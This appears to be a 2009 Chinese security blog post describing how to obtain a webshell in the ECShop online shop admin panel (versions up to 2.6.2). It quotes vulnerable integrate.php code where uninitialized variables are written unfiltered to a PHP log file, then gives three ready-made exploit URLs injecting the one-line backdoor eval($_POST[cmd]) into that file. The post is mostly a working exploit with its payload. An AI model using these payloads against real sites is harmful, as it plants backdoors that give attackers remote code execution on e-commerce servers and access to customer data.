---
title: ECShop网店系统< =V2.6.2 后台拿webshell
description: ECShop是一款开源免费的网上商店系统。由专业的开发团队升级维护，为您提供及时高效的技术支持，您还可以根据自己的商务特征对ECSHOP进行定制，增加自己商城的特色功能。（官方介绍）ECSHOP前段时间出了个注射漏洞：http://bbs.wolvez.org/topic/67/，拿后台权限应该没有问题，但文章没有提及如何ECShop网店系统<=V2.6.2后台拿webshell。昨天可乐在t00ls.Net上发帖问如何拿shell，无聊中我baidu、google了下，网上貌似没有拿shell的办法。好久没读代码了，无聊中下了ECSHOP最新版（V2.6.2）的源码过来读，很庆幸，给我找到一个可以直接写shell的文件。与注射一样，同样是个变化未初始化导致的问题，于是，同样只能用在register_globals为on的环境下。
date: 2009-04-28 10:11:01
category: 漏洞信息
tags: ['ECShop', 'webshell', '漏洞信息']
post_id: 846
alias: ECShop-V2.6.2-webshell
ViewNums: 3149
---

[ECShop](/tags/ECShop)是一款开源免费的网上商店系统。由专业的开发团队升级维护，为您提供及时高效的技术支持，您还可以根据自己的商务特征对ECSHOP进行定制，增加自己商城的特色功能。（官方介绍）

ECSHOP前段时间出了个注射漏洞：<http://bbs.wolvez.org/topic/67/>，拿后台权限应该没有问题，但文章没有提及如何[ECShop网店系统< =V2.6.2 后台拿webshell](/blog/ecshop-v262-webshell)。昨天可乐在t00ls.Net上发帖问如何拿shell，无聊中我baidu、 google了下，网上貌似没有拿shell的办法。好久没读代码了，无聊中下了ECSHOP最新版（V2.6.2）的源码过来读，很庆幸，给我找到一个可以直接写shell的文件。与注射一样，同样是个变化未初始化导致的问题，于是，同样只能用在register_globals为on的环境下。

integrate.php第740行起：

if ($_REQUEST['act'] == 'sync')
{
$size = 100;

......

$tasks = array();
if ($task_del > 0)
{
$tasks[] = array('task_name'=>sprintf($_LANG['task_del'], $task_del),'task_status'=>'<span id="task_del">' . $_LANG['task_uncomplete'] . '<span>');
$sql = "SELECT user_name FROM " . $ecs->table('users') . " WHERE flag = 2";
$del_list = $db->getCol($sql);//$del_list未初始化
}

if ($task_rename > 0)
{
$tasks[] = array('task_name'=>sprintf($_LANG['task_rename'], $task_rename),'task_status'=>'<span id="task_rename">' . $_LANG['task_uncomplete'] . '</span>');
$sql = "SELECT user_name, alias FROM " . $ecs->table('users') . " WHERE flag = 3";
$rename_list = $db->getAll($sql);//$rename_list未初始化
}

if ($task_ignore >0)
{
$sql = "SELECT user_name FROM " . $ecs->table('users') . " WHERE flag = 4";
$ignore_list = $db->getCol($sql);//$ignore_list未初始化
}

......

/* 保存修改日志 */
$fp = @fopen(ROOT_PATH . DATA_DIR . '/integrate_' . $_SESSION['code'] . '_log.php', 'wb');
$log = '';
if (isset($del_list))
{
$log .= '$del_list=' . var_export($del_list,true) . ';';
}
if (isset($rename_list))
{
$log .= '$rename_list=' . var_export($rename_list, true) . ';';
}
if (isset($ignore_list))
{
$log .= '$ignore_list=' . var_export($ignore_list, true) . ';';
}
//未做过滤，直接写log
fwrite($fp, $log);
fclose($fp);

$smarty->assign('tasks', $tasks);
$smarty->assign('ur_here',$_LANG['user_sync']);
$smarty->assign('size', $size);
$smarty->display('integrates_sync.htm');
}$del_list、$rename_list、$ignore_list均没有初始化，于是，均可以直接写shell。

利用方法：

http://www.oldjun.com/admin/integrate.php?act=sync&del_list=<?php%20eval($_POST[cmd])?>
http://www.oldjun.com/admin/integrate.php?act=sync&rename_list=<?php%20eval($_POST[cmd])?>
http://www.oldjun.com/admin/integrate.php?act=sync&ignore_list=<?php%20eval($_POST[cmd])?>三个链接，随便输入一个就可以了，生成http://www.oldjun.com/data/integrate__log.php，就是一句话小马了~

From:[www.oldjun.com](http://www.oldjun.com/)

